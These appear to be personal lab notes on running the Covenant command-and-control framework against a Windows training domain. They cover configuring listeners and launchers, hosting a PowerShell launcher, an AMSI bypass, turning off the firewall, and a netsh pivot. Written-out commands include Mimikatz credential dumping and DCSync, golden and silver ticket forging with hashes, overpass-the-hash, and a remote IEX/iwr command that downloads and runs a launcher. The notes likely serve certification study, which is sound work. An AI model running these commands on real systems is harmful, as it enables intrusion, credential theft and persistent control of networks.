### **Create Listener**

1. Name - We can name the listener with any name. We will use HTTPListener as the Name. 
2. BindAddress - If we have multiple network interface and want to listen on specify interface, we can set the BindAddress. By default, this needs to be on 0.0.0.0. 
3. BindPort - We can keep this to default 80 or change. This is the port on which the listener will bind to. 
4. ConnectPort - We can keep this to default or change. This is the port on which the agent (Grunt) will connect to. 
5. ConnectAddress - We need to enter the IP of the host on which Covenant is running. We can add multiple ConnectAddress and it can also contain the domain name which can be pointed to the Covenant host. 
6. UseSSL - We need to keep the default setting False as we are not going to use SSL for communication. 
7. HttpProfile - We can keep the ModifiedHttpProfile setting. There is an option to create a custom profile for the listener.

### **Create Launcher**
1. Name - We can name the launcher with any name. We will use PowerShellLauncher as the Name. 
2. Description - We can keep the default value. 
3. Listener - Select the HTTPListener which we created above. 
4. ImplantTemplate - We will use the default template ModifiedGruntHTTP. The implant template can be customized if needed and we can use a custom template. 
5. DotNetVersion - We will use Net40 option since .NET4.0 is by default installed on most of the newer version of windows. 
6. OutputKind – Select the WindowsApplication option from the dropdown list. We can also use ConsoleApplication as an option. 
7. ValidateCert - We can currently ignore this option as we are using HTTP listener without any SSL certificate. We can configure our listener to use HTTPS. 
8. UseCertPinning - We can also ignore this option as we are not using listener with HTTPS configuration. 
9. Delay - We can keep this as default to 5 seconds. This option is used define the sleep time between the agent (Grunt) and the Covenant host connections. Larger value will increase the time between communication and execution of the task.
10. JitterPercent - We can keep this option also set to default. This will add the variability in the Delay value.
11. ConnectAttempts - We can keep this option also set to default. This option defines the number of times the agent (Grunt) will try to connect before quitting in case of connection issues.
12. KillDate - Select a date manually when we want our agent to get killed. This option will kill the agent (Grunt) automatically on the date and time set in this option.
![[Pasted image 20231116112456.png]]

### **Host the Launcher**
1. Click on the Host tab in the PowerShell Launcher Window 
2. Added the URL of the file from which it can be accessed. We have added /HTTPGrunt.ps1 as the url. We can also add something like /FolderName/FileName.ps1 where we can mimic the folder structure. 
3. Click on Host button. 
4. Once we click on Host we will see that the Launcher & EncodedLauncher textbox are filled with value that contains the PowerShell code to download and run the Launcher. Launcher textbox contains the code in plaintext & EncodedLauncher textbox contains the code that is base64 encoded.
   ![[Pasted image 20231116112516.png]]

### **AMSI Bypass**
1. Go on the task tab of the grunt
2. Select bypass AMSI
3. Run
![[Pasted image 20231116171245.png]]+


### **Import malware and launch it**
Use the built-in task of PowerView *PowerShellImport* to import the malware

Once you done this you can go on the interact tab to launch the malware command

![[Pasted image 20231116172507.png]]

### **Download a file**
Just launch the download command
```
Download <File Name>
```

### **Create a Pivot**
There is a firewall between our kali and other machine, so we will use pwned machine as pivot
On pwned machine
```
ShellCmd netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=<OUR IP>
```
To check for Local Firewall
```
PowerShell Get-NetFirewallProfile
```
To disable local firewall
```
PowerShell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
Setup a new listener to link to the studentvm tunnel just created
![[Pasted image 20231220122530.png]]
And create a related launcher and launch it on the victim (Connect address and port -> remote pwned machine)
### **Run Mimikatz**
![[Pasted image 20231220152858.png]]
"sekurlsa::logonPasswords"

to dump domain hash from dc
 "lsadump::lsa /patch" 
"lsadump::dcsync /user:dcorp\krbtgt"

With Invoke-Mimikatz forge a golden ticket using the krbtgt hash

PowerShell Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
### **Over Pass the Hash**
Create a new binary launcher on studentListener
![[Pasted image 20231220153823.png]]
Host it
To perform the attack select the task mimikatz and launch the command (You need to have the file on the pwned machine). aes256 not rc4
```
"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<aes256> /run:C:\Users\Public\Downloads\BinaryStudent.exe"
```
![[Pasted image 20231220155219.png]]
New grunt inside the launcher pwned machine will appear that has the svcadmin token inside
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
```
![[Pasted image 20231220155527.png]]

### **Launch a Grunt inside another machine**
```
PowerShell Invoke-Command -ScriptBlock {PowerShell -Sta -Nop -Window Hidden -Command "IEX (iwr '<IP AND PATH TO LAUNCHER>' -UseBasicParsing)"} -ComputerName <MACHINE NAME>
```

### **Persistence**
Create a silver ticket to HOST service to create a schedule task that open a new grunt
```
PowerShell Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /user:Administrator /ptt"'
```
![[Pasted image 20231221104319.png]]